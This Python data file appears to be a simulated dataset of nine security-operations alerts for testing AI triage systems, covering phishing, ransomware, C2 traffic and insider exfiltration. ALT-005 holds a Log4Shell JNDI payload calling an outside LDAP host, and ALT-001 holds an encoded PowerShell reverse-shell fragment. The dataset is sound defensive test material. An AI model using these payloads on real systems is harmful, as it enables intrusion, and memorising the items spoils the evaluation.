# SOC Alert Simulation Dataset
# Used for testing AI-powered triage and alert prioritization systems

ALERTS = [

    {
        "id": "ALT-001",
        "source": "Endpoint EDR",
        "description": "Suspicious macro-based PowerShell execution",
        "alert": """
ALERT SOURCE: Endpoint EDR
TIMESTAMP: 2026-02-26 03:14:22
HOST: DESKTOP-HR04
USER: sarah.jones

Process creation event detected:
Parent Process: WINWORD.EXE
Child Process: cmd.exe
Command Line: cmd.exe /c powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==

Context:
- User opened email attachment
- No similar behavior in last 30 days
- Attachment: invoice_march2026.docm
"""
    },

    {
        "id": "ALT-002",
        "source": "Firewall",
        "description": "Outbound connection to known C2 infrastructure",
        "alert": """
ALERT SOURCE: Perimeter Firewall
TIMESTAMP: 2026-02-26 03:15:01
HOST: 10.0.1.45

Outbound connection BLOCKED:
Destination IP: 185.220.101.47
Destination Port: 4444
Protocol: TCP
Duration: 12 minutes
Bytes transferred: 2.3MB

Threat Intelligence:
Destination IP identified as known Tor exit node and C2 server
"""
    },

    {
        "id": "ALT-003",
        "source": "Active Directory",
        "description": "Account lockout from multiple internal sources",
        "alert": """
ALERT SOURCE: Domain Controller
TIMESTAMP: 2026-02-26 03:16:44
USER: john.smith

Account lockout detected:
Failed attempts: 5 in 60 seconds
Source IPs: 192.168.1.102, 192.168.1.103, 192.168.1.104
"""
    },

    {
        "id": "ALT-004",
        "source": "CASB / DLP",
        "description": "Mass data exfiltration by resigning employee",
        "alert": """
ALERT SOURCE: CASB
TIMESTAMP: 2026-02-26 03:17:30
USER: mike.chen (Finance)

Unusual data download:
4.7GB downloaded in 8 minutes
Sensitive files transferred to personal cloud storage
User submitted resignation yesterday
"""
    },

    {
        "id": "ALT-005",
        "source": "IDS/IPS",
        "description": "Log4Shell exploit attempt on unpatched server",
        "alert": """
ALERT SOURCE: IDS/IPS
TIMESTAMP: 2026-02-26 03:18:55
Target: Internal Java Application Server
Exploit: CVE-2021-44228 (Log4Shell)
Payload: ${jndi:ldap://91.109.182.3:1389/a}

Server running vulnerable Log4j version
Patch status: UNPATCHED
"""
    },

    {
        "id": "ALT-006",
        "source": "Endpoint EDR",
        "description": "Malicious persistence via scheduled task",
        "alert": """
ALERT SOURCE: Endpoint EDR
TIMESTAMP: 2026-02-26 04:21:03
HOST: DESKTOP-FIN02

Scheduled task created:
Name: WindowsUpdate_Helper
Executable: C:\\Users\\Public\\svchost32.exe
Trigger: Every 15 minutes

File unsigned and flagged as malicious (34/68 engines)
"""
    },

    {
        "id": "ALT-007",
        "source": "Email Gateway",
        "description": "Business Email Compromise attempt",
        "alert": """
ALERT SOURCE: Email Security Gateway
TIMESTAMP: 2026-02-26 04:45:12

Phishing email detected:
Impersonation of CEO
Request for urgent wire transfer ($85,000)
Domain registered 2 days ago
Multiple finance employees targeted
"""
    },

    {
        "id": "ALT-008",
        "source": "Endpoint EDR",
        "description": "Ransomware behavior detected",
        "alert": """
ALERT SOURCE: Endpoint EDR
TIMESTAMP: 2026-02-26 05:10:44
HOST: SERVER-PROD-01

Indicators:
- 50,000 files encrypted in 4 minutes
- Shadow copies deleted
- Ransom note dropped in directories
- Suspicious high CPU encryption process
"""
    },

    {
        "id": "ALT-009",
        "source": "Web Proxy",
        "description": "Suspicious password reset reconnaissance",
        "alert": """
ALERT SOURCE: Secure Web Gateway
TIMESTAMP: 2026-02-26 05:33:19
USER: alex.kumar

User accessed 14 password reset pages
Admin access to production AWS
No helpdesk ticket for password issue
"""
    }

]